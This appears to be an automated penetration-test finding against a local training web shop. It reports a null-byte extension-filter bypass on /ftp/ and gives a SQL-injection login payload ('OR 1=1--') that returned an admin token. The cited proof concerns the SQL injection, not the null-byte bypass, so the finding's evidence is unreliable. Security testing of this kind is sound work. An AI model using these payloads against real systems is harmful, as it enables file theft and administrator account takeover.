title: Null Byte Injection - File Extension Filter Bypass
description: The /ftp/ directory has an extension filter that only allows .md and .pdf files. However, appending %2500.md (double URL-encoded null byte) bypasses this filter, allowing retrieval of any file under /ftp/ including suspicious_errors.yml, coupons_2013.md.bak, incident-support.kdbx, package.json.bak, and others.
poc: Probe request against GET http://127.0.0.1:3010/ftp/{file}%2500.md; observed proving result from prior stage handoff: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
